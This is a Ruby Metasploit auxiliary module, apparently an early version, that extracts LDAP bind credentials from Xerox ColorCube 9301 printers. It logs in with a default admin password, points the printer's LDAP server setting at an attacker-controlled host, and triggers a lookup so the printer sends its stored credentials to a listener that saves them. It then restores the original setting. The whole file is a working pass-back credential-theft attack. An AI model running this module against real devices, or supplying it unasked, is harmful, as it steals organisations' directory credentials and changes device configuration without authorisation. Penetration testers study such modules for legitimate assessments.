#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'
require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Xerox Colorcube 9301 LDAP credential extractor',
      'Description'    => %{
        This module extract the the printers LDAP user and password from Xerox Colorcube 9301. 
      },
      'Author'         =>
        [
          'Deral "Percentx" Heiland',
          'Pete "Bokojan" Arzamendi'
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", false]),
        OptString.new('PASSWORD', [true, "Password to access administrative interface. Defaults to 1111", '1111']),
        OptInt.new('RPORT', [ true, "The target port", 80]),
        OptInt.new('TIMEOUT', [true, 'Timeout for printer probe', 20]),
        OptInt.new('TCPDELAY', [true, 'Number of seconds the tcp server will wait before termination'])
      ], self.class)
  end


  def run_host(ip)
    print_status("Attempting to LDAP username and password for the host at #{rhost}")
    login
    get_ldap_server_info
    update_ldap_server    
    start_listener
    restore_ldap_server
    #Woot we got creds so lets save them.
        	print_good( "Found the following creds were capured: #{$data}")
        	loot_name     = "ldap.cp.creds"
        	loot_type     = "text/plain"
        	loot_filename = "ldap-creds.text"
        	loot_desc     = "LDAP Pass-back Harvester"
        	p = store_loot(loot_name, loot_type, datastore['RHOST'], $data , loot_filename, loot_desc)
        	print_status("Credentials saved in: #{p.to_s}")
  end

  def login()
    login_page = "/userpost/xerox.set"
    login_cookie = "Cookie: PHPSESSID=5647559f800b29b34b04174d31d2d0de;"
    login_post_data = "_fun_function=HTTP_Authenticate_fn&NextPage=%2Fproperties%2Fauthentication%2FluidLogin.php&webUsername=admin&webPassword=#{datastore['PASSWORD']}&frmaltDomain=default"
    method = "POST"
    res = make_request(login_page,method,login_cookie,login_post_data)
     unless res.code == 200
      print_error("Failed to login on #{rhost}. Please check the password for the Administrator account ")
      return :abort
    end
  end


  def get_ldap_server_info()
    ldap_info_page = "/ldap/ldap_list.php?from=ldapConfig"
    ldap_info_cookie = "Cookie: PHPSESSID=5647559f800b29b34b04174d31d2d0de;"
    method = "GET"
    res = make_request(ldap_info_page,method,ldap_info_cookie, "")
    html_body = ::Nokogiri::HTML(res.body)
    $ldap_server = html_body.xpath('/html/body/form/div[4]/div/table/tbody/tr/td[3]').text.split(':')[0]
    print_status("Found LDAP server: #{$ldap_server}")
     unless res.code == 200
      print_error("Failed to get ldap data from #{rhost}.")
      return :abort
     end
  end

  def update_ldap_server()
  	ldap_update_page = "/dummypost/xerox.set"
  	ldap_update_post = "_fun_function=HTTP_Set_Config_Attrib_fn&NextPage=%2Fldap%2Findex.php&ldap.server%5Bdefault%5D.server=#{datastore['SRVHOST']}%3A389&ldap.maxSearchResults=25&ldap.searchTime=30"
    ldap_update_cookie = "Cookie: PHPSESSID=5647559f800b29b34b04174d31d2d0de;"
    method = "POST"
    print_status("Updating LDAP server: #{datastore['SRVHOST']}")
    res = make_request(ldap_update_page,method,ldap_update_cookie, ldap_update_post)
    unless res.code == 200
      print_error("Failed to update ldap server. Please check the host: #{rhost} ")
      return :abort
    end
   end


   def trigger_ldap_request()
   		ldap_trigger_page = "/userpost/xerox.set"
  		ldap_trigger_post = "nameSchema=cn&emailSchema=mail&ifaxSchema=No+Mappings+Available&phoneSchema=telephoneNumber&postalSchema=postalAddress&mailstopSchema=physicalDeliveryOfficeName&citySchema=l&stateSchema=st&zipCodeSchema=postalCode&countrySchema=co&faxSchema=facsimileTelephoneNumber&homeSchema=homeDirectory&memberSchema=memberOf&uidSchema=sAMAccountName&ldapSearchName=test&ldapServerIndex=default&_fun_function=HTTP_LDAP_Search_fn&NextPage=%2Fldap%2Fmappings.php"
    	ldap_trigger_cookie = "Cookie: PHPSESSID=5647559f800b29b34b04174d31d2d0de;"
    	method = "POST"
    	print_status("Triggering LDAP reqeust")
    	res = make_request(ldap_trigger_page,method,ldap_trigger_cookie, ldap_trigger_post)
	end	

  def start_listener
  	 server_timeout = datastore['TCPDELAY'].to_i
      begin
        print_status("Service running. Waiting for connection")
        	Timeout.timeout(server_timeout) do
        	exploit()
    	end
      rescue Timeout::Error
      # When the server stops due to our timeout, this is raised
      end
  end

  def primer
  		trigger_ldap_request()
  end

  def on_client_connect(client)
    on_client_data(client)
  end

  def on_client_data(client)
    $data = client.get_once
    puts @data
    client.stop
  end


 def restore_ldap_server()
  	ldap_restore_page = "/dummypost/xerox.set"
  	ldap_restore_post = "_fun_function=HTTP_Set_Config_Attrib_fn&NextPage=%2Fldap%2Findex.php&ldap.server%5Bdefault%5D.server=#{$ldap_server}%3A389&ldap.maxSearchResults=25&ldap.searchTime=30"
    ldap_restore_cookie = "Cookie: PHPSESSID=5647559f800b29b34b04174d31d2d0de;"
    method = "POST"
    print_status("Restoring LDAP server: #{$ldap_server}")
    res = make_request(ldap_restore_page,method,ldap_restore_cookie, ldap_restore_post)
    unless res.code == 200
      print_error("Failed to restore LDAP server: #{@ldap_server}. Please fix manually")
      return :abort
    end
   end


  def make_request(page,method,cookie,post_data)
    begin   
      res = send_request_cgi(
      {
        'uri'       => page,
        'method'    => method,
        'Cookie'    => cookie,
        'data'      => post_data
      }, datastore['TIMEOUT'].to_i)
      return res
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      print_error("#{rhost}:#{rport} - Connection failed.")
      return :abort
    end
  end    
end